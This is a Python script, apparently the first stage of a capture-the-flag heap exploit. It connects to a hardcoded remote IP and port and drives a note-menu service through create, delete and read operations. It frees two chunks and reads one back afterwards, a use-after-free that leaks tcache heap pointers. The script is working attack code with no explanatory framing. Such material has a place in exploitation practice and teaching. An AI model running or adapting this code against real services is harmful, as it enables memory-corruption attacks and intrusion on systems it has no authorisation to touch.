import socket, time, struct, binascii

def recv_all(s, timeout=0.3, count=10):
    out=b''
    s.settimeout(timeout)
    for _ in range(count):
        try:
            r=s.recv(8192)
            if not r: break
            out+=r
        except:
            break
    return out

host='52.76.96.108'; port=9005

def create(idx, size, data):
    s.send(b"1\n"); time.sleep(0.07); recv_all(s,0.1,2)
    s.send(str(idx).encode()+b"\n"); time.sleep(0.07); recv_all(s,0.1,2)
    s.send(str(size).encode()+b"\n"); time.sleep(0.07); recv_all(s,0.1,2)
    s.send(data); time.sleep(0.07); return recv_all(s,0.1,2)

def edit(idx, data):
    s.send(b"2\n"); time.sleep(0.07); recv_all(s,0.1,2)
    s.send(str(idx).encode()+b"\n"); time.sleep(0.07); recv_all(s,0.1,2)
    s.send(data); time.sleep(0.07); return recv_all(s,0.1,2)

def readn(idx):
    s.send(b"4\n"); time.sleep(0.07); recv_all(s,0.1,2)
    s.send(str(idx).encode()+b"\n"); time.sleep(0.07); return recv_all(s,0.3,5)

def delete(idx):
    s.send(b"3\n"); time.sleep(0.07); recv_all(s,0.1,2)
    s.send(str(idx).encode()+b"\n"); time.sleep(0.07); return recv_all(s,0.1,2)

def parse_data(resp):
    # returns bytes between 'data: ' and newline
    i=resp.find(b'data: ')
    if i==-1: return None
    j=resp.find(b'\n', i)
    return resp[i+6:j]

s=socket.socket(); s.settimeout(0.4); s.connect((host,port)); time.sleep(0.3)
print(s.recv(8192).decode(errors='replace'))

# heap leak: small chunks double free into tcache
print("create0", create(0,0x30,b"A"*0x2f+b"\n"))
print("create1", create(1,0x30,b"B"*0x2f+b"\n"))
print("del0", delete(0))
print("del1", delete(1))
r=readn(1)
d=parse_data(r)
print("read1 raw:", r)
print("data bytes:", d.hex() if d else None)
if d: print("fd =", hex(struct.unpack('<Q', d[:8])[0]), "key? =", hex(struct.unpack('<Q', d[8:16])[0]))
s.close()
